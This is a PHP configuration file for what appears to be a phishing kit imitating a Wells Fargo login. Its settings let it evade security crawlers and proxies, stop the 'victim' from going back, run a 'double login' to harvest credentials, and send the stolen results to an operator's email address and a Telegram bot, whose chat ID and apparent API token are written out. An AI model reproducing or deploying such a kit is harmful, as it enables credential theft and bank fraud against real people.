<?php



$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "toomaa_8@aol.com",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"double_login"	=> "1",	// Double Login 
	"enable_email"	=> "1",	// 1=Enable 0=Disable  
	"telegram"		=> "1",	// Telegram Bots Receiver
	"country"		=> "US", // Target SPAM Country
	"chat_id"		=> "1947824557",	// Chat ID Of You
	"bot_url"		=> "bot5283664178:AAG-Y6t9aRr8s0XTBTZtLbdqWsbBYAOqQK4",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "wellsfargo+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	"email"			=> "toomaa_8@aol.com",	// Your E-Mail
);
return $settings;



?>
